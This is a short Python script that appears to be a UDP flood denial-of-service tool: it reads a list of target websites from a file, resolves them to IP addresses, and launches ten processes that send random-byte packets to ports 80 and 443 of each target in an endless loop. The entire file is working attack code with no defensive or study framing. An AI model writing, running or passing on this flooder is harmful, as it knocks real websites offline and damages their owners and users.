import time
import socket
import random
import multiprocessing

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

used_random_ports = [80, 443]
# used_random_ports = [80, 443, 110, 995, 143, 993, 26, 587, 3306, 2082, 2083, 2086, 2087, 2095, 2096, 2077, 2078]

port_value = random.choice(used_random_ports)

# Open file with hosts
with open('sites.txt') as f:
    sites = f.readlines()


def dns_resolve():
    global sent, clean_ip
    ips = []
    print("Targeted sites: \n")

    for site in sites:
        site = site.replace("http://", "")
        site = site.replace("https://", "")
        site = site.replace("www.", "")
        site = site.replace(",", "")
        site = site.replace('"', "")
        site = site.replace("'", "")
        site = site.replace("\n", "")
        site = site.replace("\t", "")
        site = site.strip()
        if site[-1] == "/":
            site = site[:-1]
        print('"' + site + '",')
        try:
            ips.append(socket.gethostbyname(site))
        except:
            print(f"Could not resolve:  {site} ")

    port = 1
    sent = 0

    # remove duplicates
    clean_ip = []
    [clean_ip.append(x) for x in ips if x not in clean_ip]
    print(f"Amount of unique IPs {len(clean_ip)}")


dns_resolve()


def send_packets():
    while True:
        global sent, port_value
        for ip in clean_ip:
            port_value = random.choice(used_random_ports)
            sock.sendto(bytes, (ip, port_value))
            print("Sent {} packets to {} thought port: {} size {}".format(sent, ip, port_value, packet_size))
            sent = sent + 1
            # port = port + 2
            # if port > 65534:
            #     port = 1
            time.sleep(0.001)


# Create multithreading job list
process_list = []
for i in range(10):
    packet_size = random.randint(10, 20)
    bytes = random._urandom(packet_size)

    p = multiprocessing.Process(target=send_packets)
    p.start()
    process_list.append(p)

for process in process_list:
    process.join()
